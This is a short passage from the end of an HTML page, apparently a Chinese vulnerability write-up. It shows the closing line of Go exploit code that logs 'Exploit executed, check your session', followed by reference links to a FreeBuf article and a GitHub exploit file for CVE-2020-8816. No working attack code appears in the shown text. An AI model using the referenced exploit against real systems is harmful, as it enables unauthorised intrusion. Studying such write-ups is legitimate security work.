class="cs9FB05234"> &nbsp;&nbsp;&nbsp;log.Println(&quot;Exploit executed, check your session&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.freebuf.com/vuls/234533.html</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://github.com/team0se7en/CVE-2020-8816/blob/master/CVE-2020-8816.go</span></p></body>
</html>
